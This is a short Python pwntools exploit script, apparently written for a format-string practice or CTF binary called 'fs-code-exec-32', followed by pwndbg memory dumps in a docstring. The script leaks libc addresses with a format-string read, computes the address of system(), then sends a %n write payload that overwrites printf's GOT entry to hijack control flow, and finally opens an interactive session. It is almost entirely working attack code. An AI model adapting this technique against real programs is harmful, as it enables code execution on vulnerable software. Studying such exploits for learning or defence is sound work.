#!/usr/bin/env python

from pwn import *

p = process("./fs-code-exec-32")

printf_plt = p32(0x0804a010)
p.sendline(printf_plt + "%7$4s")

data = p.recv().split()[6][4:]

enc_data = []
for i in range(0,len(data), 4): enc_data.append(u32(data[i:i+4]))
for x in enc_data: print(hex(x))

printf_libc = enc_data[0]
system_libc = printf_libc - 59600
printf_got = enc_data[1] - 22
print("//" + str(hex(system_libc)))

#we'll try this here
printf_got = 0x0804a010

t = str(hex(system_libc))
t_l = t[:6]
t_r = "0x" + t[-4:]

str1 = str(int(t_r,16) - 8)
str2 = str(int(t_l,16) - int(t_r,16))
string = p32(printf_got) + p32(printf_got + 2) + "%" + str1 + "x%7$n%" + str2 + "x%8$n"
p.sendline(string)
print(p.recv())

p.interactive()

"""
pwndbg> x/x 0x8048440
0x8048440:      0xa01025ff
pwndbg>
0x8048444:      0x08680804
pwndbg> x/x 0x8048440-4
0x804843c:      0xffffffe0
pwndbg>
0x8048440:      0xa01025ff
pwndbg>
0x8048444:      0x08680804
pwndbg>
0x8048448:      0xe9000000
pwndbg>
0x804844c:      0xffffffd0
pwndbg>
0x8048450:      0xa01425ff
pwndbg>
0x8048454:      0x10680804
pwndbg>
0x8048458:      0xe9000000
pwndbg>
0x804845c:      0xffffffc0
pwndbg>
0x8048460:      0xa01825ff
pwndbg>
0x8048464:      0x18680804
pwndbg>
0x8048468:      0xe9000000
pwndbg>
0x804846c:      0xffffffb0
pwndbg>
0x8048470:      0xa01c25ff
pwndbg>
0x8048474:      0x20680804
"""
